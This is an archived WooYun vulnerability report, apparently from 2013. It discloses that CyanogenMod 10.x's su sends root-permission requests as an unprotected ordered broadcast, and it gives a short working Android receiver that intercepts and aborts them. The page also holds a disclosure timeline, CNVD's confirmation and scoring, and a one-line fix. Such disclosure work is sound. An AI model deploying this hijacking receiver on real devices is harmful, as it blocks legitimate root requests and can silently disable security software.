@@ -1,0 +1,207 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		su提权广播劫持导致拒绝服务攻击  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		su提权广播劫持导致拒绝服务攻击  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/milkee">milkee</a> 
+</li><li>提交时间：		2013-03-03 15:02</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-07：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-03-10：	细节向第三方安全合作伙伴开放<br/>
+									2013-03-17：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-03-27：	细节向普通白帽子公开<br/>
+									2013-04-16：	细节向实习白帽子公开<br/>
+									2013-04-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">CyanogenMod 10.x使用的su的提权请求可以被劫持，导致正常的提权请求无法被响应，app提权失败。虽然写的厂商是CyanogenMod，但是这个版本的su还可能被许多其他ROM使用。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">开源的代码，分析起来很方便哈。<br />
+<br />
+<br />
+<br />
+1. su直接使用am命令发送提权请求广播给superuser（root授权管理软件），代码见<br />
+<br />
+https://github.com/CyanogenMod/android_system_su/blob/ics/activity.c<br />
+<br />
+</p><pre><code>sprintf(command, &quot;(/system/bin/am broadcast -a &#039;%s&#039; --es socket &#039;%s&#039; --ei caller_uid &#039;%d&#039; --ei allow &#039;%d&#039; --ei version_code &#039;%d&#039; %s) &gt; /dev/null&quot;,<br />
+			action, socket_path, ctx-&gt;from.uid, allow, VERSION_CODE,<br />
+			strcmp(action, ACTION_RESULT) ? &quot;&quot; : &quot;&amp;&quot;);</code></pre><p class='detail'><br />
+<br />
+这个广播并没有对接收者身份进行验证，而且am发送的是有序广播，因此可以注册一个高优先级的接收器接收并终止广播。<br />
+<br />
+<br />
+<br />
+注册广播接收器FakeSuRequestReceiver<br />
+<br />
+</p><pre><code>&lt;receiver android:name=&quot;.FakeSuRequestReceiver&quot; &gt;<br />
+    &lt;intent-filter android:priority=&quot;10000&quot;&gt;<br />
+        &lt;action android:name=&quot;com.noshufou.android.su.REQUEST&quot; /&gt;<br />
+    &lt;/intent-filter&gt;<br />
+&lt;/receiver&gt;</code></pre><p class='detail'><br />
+<br />
+接收并终止广播<br />
+<br />
+</p><pre><code>public class FakeSuRequestReceiver extends BroadcastReceiver {<br />
+	public void onReceive(Context arg0, Intent arg1) {<br />
+		// Superuser will not received the su request broadcast <br />
+		// if we abort it here<br />
+		abortBroadcast();<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+2. superuser接收不到提权请求，app的root提权申请失败。比如LBE的主动防御需要root权限，提权失败后主动防御无法启动，恶意软件的行为无法被发现。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">广播劫持并不是新问题，su和superuser的都是开源的，分析起来也不难，有兴趣的可以自己看下源码，也很容易重现。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/02162749b40703825b0778f08ec8f512d07b1c8d.png" target="_blank"><img src="../images/02162749b40703825b0778f08ec8f512d07b1c8d.png" alt="1.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对广播增加权限保护 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/milkee" title="milkee">milkee</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-019422" title="su提权广播劫持导致拒绝服务攻击">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-03-07 22:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述情况，并在6日已联系上软件生产厂商，软件厂商回应迅速，已经提供了修复措施（见回复）。<br />
+<br />
+按本地攻击进行评分，基本危害评分5.12(中危)，发现技术难度系数1.3，涉及行业或单位影响系数1.4，综合rank=5.12*1.3*1.4=9.318<br />
+<br />
+wooyun上的web漏洞已经比较多，这样的应用软件漏洞还是值得鼓励。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="19422";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
